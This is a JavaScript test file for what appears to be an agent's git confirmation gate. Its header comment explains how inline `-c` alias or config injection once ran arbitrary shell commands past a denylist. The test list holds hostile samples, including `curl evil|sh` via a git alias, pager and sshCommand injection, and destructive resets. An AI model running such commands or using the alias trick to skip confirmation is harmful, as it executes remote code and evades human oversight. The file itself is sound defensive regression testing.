// SPDX-License-Identifier: GPL-3.0-or-later
// SEC-2 (REV-124): the git confirmation gate used a DENYLIST of mutating verbs, which
// was unsound two ways: (1) `git -c alias.x='!cmd' x` runs an arbitrary shell command
// under an alias name no denylist contains — an RCE that skipped confirmation; and
// (2) any mutating verb not enumerated (switch, pull, branch, worktree, update-ref, …)
// also slipped through. The gate now uses an ALLOWLIST of read-only verbs plus an
// always-confirm rule for inline `-c` / `--config-env` config injection. Each
// MUST_CONFIRM case is unconfirmed under the old denylist and confirmed under the fix.
const test = require('node:test');
const assert = require('node:assert/strict');

const { requiresConfirmation } = require('../dist/safetyPolicy.js');

const MUST_CONFIRM = [
  // Inline config injection is arbitrary code execution regardless of subcommand.
  ['git', ['-c', "alias.co=!sh -c 'curl evil|sh'", 'co']],
  ['git', ['-c', 'core.pager=!evil', 'log']],
  ['git', ['-c', 'core.sshCommand=evil', 'status']],
  ['git', ['-calias.x=!evil', 'x']], // attached -c form
  ['git', ['--config-env', 'core.pager=EVIL', 'log']],
  ['git', ['--config-env=core.pager=EVIL', 'log']],
  // Mutating verbs the old denylist did not enumerate.
  ['git', ['switch', 'main']],
  ['git', ['pull']],
  ['git', ['branch', '-D', 'feature']],
  ['git', ['worktree', 'add', '/tmp/x']],
  ['git', ['update-ref', 'refs/heads/x', 'HEAD']],
  ['git', ['config', '--global', 'user.name', 'x']],
  ['git', ['fetch', 'origin']],
  ['git', ['gc']],
  // An unknown subcommand may be an alias to anything, so it confirms.
  ['git', ['co']],
  // Previously-covered mutating verbs still confirm.
  ['git', ['-C', '/repo', 'reset', '--hard']],
  ['git', ['push']],
];

for (const [command, args] of MUST_CONFIRM) {
  test(`REV-124: gates "${command} ${args.join(' ')}"`, () => {
    assert.equal(requiresConfirmation(command, args), true);
  });
}

const NO_CONFIRM = [
  ['git', ['status']],
  ['git', ['log', '--oneline']],
  ['git', ['diff']],
  ['git', ['diff', '-c']], // `-c` AFTER the subcommand is a combined-diff option, not injection
  ['git', ['show', 'HEAD']],
  ['git', ['-C', '/repo', 'status']],
  ['git', ['rev-parse', 'HEAD']],
  ['git', ['for-each-ref']],
  ['git', ['version']],
  ['git', ['--version']],
];

for (const [command, args] of NO_CONFIRM) {
  test(`REV-124: allows read-only "${command} ${args.join(' ')}"`, () => {
    assert.equal(requiresConfirmation(command, args), false);
  });
}
